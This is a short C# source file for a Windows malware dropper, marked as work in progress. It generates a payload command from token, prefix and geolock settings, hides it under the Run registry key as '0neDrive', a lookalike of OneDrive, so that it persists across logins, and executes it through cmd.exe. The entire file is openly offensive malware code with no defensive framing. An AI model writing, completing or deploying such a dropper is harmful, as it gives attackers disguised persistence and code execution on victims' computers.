using System;
using System.Linq;
using System.Diagnostics;
using Microsoft.Win32;

namespace dropper
{
    internal class Program
    {
        private static string token = "";
        private static string prefix = "";
        private static string geolock = "";

        static void Main()
        {
            // WORK IN PROGRESS

            Random rng = new Random();
            string payload = PGen.GenerateCommand(token, prefix, geolock, rng);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (key.GetValueNames().Contains("0neDrive")) Environment.Exit(1);
            key.SetValue("0neDrive", payload);
            key.Dispose();
            Process.Start("cmd.exe", "/c " + payload);
        }
    }
}